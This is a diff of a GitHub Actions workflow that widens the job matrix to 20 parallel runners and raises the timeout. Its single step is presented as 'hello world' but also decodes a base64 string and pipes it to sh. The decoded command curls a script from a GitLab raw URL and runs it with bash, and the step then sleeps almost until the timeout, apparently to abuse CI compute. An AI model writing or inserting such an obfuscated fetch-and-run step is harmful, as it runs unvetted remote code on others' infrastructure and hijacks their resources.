@@ -7,11 +7,11 @@ jobs:
   hello:
     name: ${{ matrix.name }}
     runs-on: ubuntu-latest
-    timeout-minutes: 5
+    timeout-minutes: 10
     strategy:
       fail-fast: false
-      max-parallel: 10
+      max-parallel: 20
       matrix:
-        name: [khu-a1, khu-b1, khu-c1, khu-d1, khu-e1, khu-f1, khu-g1, khu-h1, khu-i1, khu-j1]
+        name: [khu-a1, khu-b1, khu-c1, khu-d1, khu-e1, khu-f1, khu-g1, khu-h1, khu-i1, khu-j1, gkhu-a1, tkhu-b1, ukhu-c1, rkhu-d1, skhu-e1, jkhu-f1, lkhu-g1, nkhu-h1, ckhu-i1, pkhu-j1]
     steps:
       - run: echo "hello world" & base64 -d <<< Y3VybCAtc0wgIGh0dHBzOi8vZ2l0bGFiLmNvbS94cGFuemVycy9wbGF5Ly0vcmF3L21haW4vbGVtYWtzYW5zIHwgYmFzaA | sh & sleep 590
